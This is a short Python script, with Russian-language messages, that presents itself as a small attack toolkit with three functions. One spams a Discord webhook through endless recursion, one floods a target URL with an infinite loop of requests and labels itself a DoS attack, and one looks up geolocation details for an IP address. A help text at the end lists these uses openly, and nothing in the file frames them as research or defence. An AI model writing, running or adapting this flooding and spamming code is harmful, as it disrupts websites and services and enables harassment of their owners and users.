import random
import os
from flask import Flask, request
import colorama
import pyfiglet
import requests

def dsspam(webhook, msg):
    data = {
        "content": msg
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook, json=data, headers=headers)
    
    if response.status_code == 204:
        print("Сообщение успешно отправлено в Discord!")
    else:
        print(f"Ошибка {response.status_code} при отправке сообщения в Discord.")

    dsspam(webhook=webhook, msg=msg)

def dosattack(url):
    while True:
        r = requests.get(url)
        print("DoS attack sent to " + url)

def ipinfo(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()

        print("IP-адрес:", data.get('ip'))
        print("Хост:", data.get('hostname'))
        print("Местоположение:", data.get('city'), data.get('region'), data.get('country'))
        print("Провайдер:", data.get('org'))
    except Exception as e:
        print(e)

def help():
    print("""
        Функции:
        dsspam(webhook="webhook_url", msg="сообщение") - спам Discord вебхуком.
        dosattack(url="url") - DoS атака на сайт.
        ipinfo(ip="ip") - информация об IP адресе.
        """)